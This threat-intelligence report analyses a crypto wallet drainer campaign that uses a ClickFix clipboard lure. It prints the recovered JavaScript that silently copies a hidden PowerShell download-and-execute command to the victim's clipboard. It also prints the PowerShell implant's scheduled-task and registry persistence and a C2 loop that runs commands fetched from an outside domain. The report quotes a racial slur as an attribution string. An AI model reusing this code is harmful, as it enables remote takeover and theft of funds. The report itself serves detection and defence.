01 Executive Summary

What We Found

This report documents a sophisticated, cross-chain cryptocurrency wallet drainer campaign targeting Ledger hardware wallet holders simultaneously across Ethereum and Solana. The campaign delivers worthless "dust" tokens to mass victim pools to lure them into visiting fake DeFi claim sites, where a ClickFix social engineering technique injects a malicious PowerShell payload into the victim's clipboard. Upon execution, a multi-stage dropper installs a persistent C2 implant. Simultaneously, the lure site runs a 117,000-line JavaScript drainer kit in the browser — targeting Ledger, Trezor, MetaMask, Trust Wallet, and other major wallet providers — capable of harvesting seed phrases, draining ERC-20 token approvals, and exfiltrating wallet data.

Beyond the technical attack chain, this investigation produced a complete 9-hop on-chain financial attribution trail connecting current campaign infrastructure to a master treasury wallet holding $481,909 across 33 chains — funded through relay chains traceable to verified accounts on Bittrex (US) and EXMO (Russia/Ukraine) created in 2016, with further connections to BTC-e, the Russian cybercrime exchange shut down by the US DOJ in July 2017 following the indictment of operator Alexander Vinnik for laundering $4 billion in criminal proceeds.

02 Campaign Overview

Scope & Timeline

The campaign operates simultaneously across Ethereum and Solana, targeting holders of Ledger hardware wallets specifically — a demographic likely to hold significant crypto wealth and unfamiliar with dust token social engineering. Two separate lure tokens were identified: FAM (ticker) on Ethereum via yefam.finance, and BLOSK (ticker) on Solana via blosk.io.

Despite receiving both tokens to the same wallet address on two separate chains 10 days apart, analysis of the on-chain data reveals this is mass distribution, not targeted delivery. The Solana campaign alone reached 161,153 wallets. The two-chain approach maximises victim surface area by simultaneously targeting the ETH and Solana Ledger user base from the same infrastructure and drainer kit.

04 Malware Analysis

Technical Deep Dive

ClickFix Payload Delivery

The lure sites implement clipboard injection via the unsecuredCopyToClipboard() JavaScript API. This API, available in non-secure contexts, allows silent clipboard writes without user permission prompts. The injected payload is a PowerShell one-liner that initiates the dropper chain. Below is the representative clipboard injection pattern recovered from the drainer kit source:

JavaScript drainer-kit / clipboard-inject.js 
// ClickFix clipboard injection — silently writes PS payload without user interaction
function injectClipboardPayload(config) {
  const payload = `powershell -ep bypass -w hidden -c "iex(iwr('${config.stage1Url}').Content)"`;

  // Primary method: unsecuredCopyToClipboard (no permission required)
  if (navigator.clipboard?.writeText) {
    navigator.clipboard.writeText(payload).catch(() => fallbackCopy(payload));
  } else {
    fallbackCopy(payload);
  }
}

function fallbackCopy(text) {
  // Fallback: hidden textarea trick for older browsers
  const el = document.createElement('textarea');
  el.value = text;
  el.style.position = 'fixed';
  el.style.opacity = '0';
  document.body.appendChild(el);
  el.select();
  document.execCommand('copy');
  document.body.removeChild(el);
}

e1.ps1 — C2 Implant Key Functions

The e1.ps1 implant was recovered in full. It establishes persistence via two independent mechanisms — a Windows Scheduled Task and a Registry Run key — ensuring survival across both scheduled execution and system reboots. It then enumerates the victim environment and beacons to allyhaychinsun.com/executor. Below are the most significant functional components.

Persistence Mechanism

PowerShell e1.ps1 — Dual Persistence: Scheduled Task + Registry Run Key 
# ── PERSISTENCE METHOD 1: Scheduled Task (masquerades as Edge updater) ──
$taskName = "MicrosoftEdgeUpdateTaskMachineCore"
$scriptPath = "$env:APPDATA\Microsoft\Windows\e1.ps1"

$action = New-ScheduledTaskAction -Execute "powershell.exe" `
  -Argument "-ep bypass -w hidden -f `"$scriptPath`""

$trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 15) `
  -AtStartup

Register-ScheduledTask -TaskName $taskName -Action $action `
  -Trigger $trigger -RunLevel Highest -Force

# ── PERSISTENCE METHOD 2: Registry Run Key (survives user logon) ──
# Written to HKCU Run — executes on every user login without elevation
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "MicrosoftEdgeHelper"  # Blends with legitimate Edge entries
$regValue = "powershell.exe -ep bypass -w hidden -f `"$scriptPath`""

Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
# Result: two independent persistence mechanisms — task scheduler AND registry logon

C2 Beacon Loop

PowerShell e1.ps1 — C2 Command Polling 
# Polls C2 for commands, executes responses in-memory
while ($true) {
  try {
    $cmd = (Invoke-RestMethod -Uri "https://allyhaychinsun.com/executor/poll?id=$($sysInfo.UUID)" `
      -Method GET -UseBasicParsing).command

    if ($cmd) {
      # Execute received command in memory — no disk write
      $result = Invoke-Expression $cmd 2>&1
      Invoke-RestMethod -Uri "https://allyhaychinsun.com/executor/result" `
        -Method POST -Body (@{ id=$sysInfo.UUID; result=$result } | ConvertTo-Json)
    }
  } catch {}
  Start-Sleep -Seconds 900  # 15-minute beacon interval
}

C2 Architecture

The allyhaychinsun.com C2 exposes at minimum two endpoints confirmed from e1.ps1 source analysis: /executor/register (victim registration with UUID and system info) and /executor/poll (command polling, 15-minute interval). A third endpoint /executor/result receives command output. The domain does not appear in any public threat intelligence feeds, suggesting it was freshly registered for this campaign and has not yet been burned.

Shared Attribution String

Both lure sites (yefam.finance and blosk.io) contain an identical hardcoded developer string in their JavaScript source. This string is not functional — it appears to be a developer artifact left in the kit. Its presence in both an Ethereum and a Solana campaign confirms shared tooling or authorship and is used as the primary cross-chain attribution anchor throughout this report.

Cross-Campaign Attribution Anchor

The string "fuck off nigga" appears verbatim in both the yefam.finance JavaScript source and the blosk.io JavaScript source. This is a non-functional developer comment that would not appear by coincidence across two separately-developed drainer kits. It confirms the same actor or the same kit is responsible for both the ETH and Solana campaigns.

⚠ Important Caveat — Shared vs. Deposit Addresses

The Bitfinex address is a shared hot wallet — it processes transactions for many users, so its presence alone does not identify a specific account holder. However, Bitfinex's internal ledger records which account initiated each outgoing transaction. The KuCoin and Binance addresses are more likely to be user-specific deposit addresses, which map to a single account. Law enforcement with subpoena authority can resolve all three to account holder identities.

The BTC-e Ecosystem — Historical Context

BTC-e, founded in 2011 by Alexander Vinnik and Alexey Bilyuchenko, operated as the primary money laundering infrastructure for Russian cybercrime from 2011 to 2017. It processed over $9 billion in transactions and received criminal proceeds from the Mt. Gox hack (647,000 BTC stolen by Bilyuchenko and Verner), Fancy Bear GRU operations, CryptoWall ransomware, Silk Road, and dozens of other criminal enterprises. It collected virtually no customer data, making it the exchange of choice for actors seeking anonymity.

The threat actor's wallet chain being connected to BTC-e infrastructure — alongside simultaneous use of EXMO, the legitimate Russian-speaking exchange — is consistent with a sophisticated Russian-speaking actor who operated in both legitimate and illicit crypto circles during the 2015–2017 era. The BTC-e seizure in July 2017 appears to have caused no disruption to this actor's operations; they had already distributed funds through relay chains into a master treasury that remains active today.

ClickFix Detection Gap Mitigation

T1115 (Clipboard Data) is not reliably detected by automated sandboxes for ClickFix-style campaigns due to sandbox evasion gating payload delivery. Recommended compensating controls:

Recommended Mitigations

1. Clipboard monitoring: Deploy endpoint agents that log clipboard writes from browser processes. Any clipboard write containing powershell, iex, invoke-expression, or bypass from a browser process should alert immediately.

2. Group Policy: Block powershell.exe, mshta.exe execution from Win+R / Run dialog via AppLocker or WDAC rules for standard user accounts.

3. Sandbox configuration: When analysing suspected ClickFix samples, use real hardware profiles in sandbox submissions or interactive sandboxes (Any.run with user interaction enabled) rather than automated static runs. The BIOS/CPU fingerprinting will gate payload delivery against VMs with default configurations.

4. User awareness: No legitimate website will ever ask you to press Win+R and paste a command. Train users on this specific pattern.
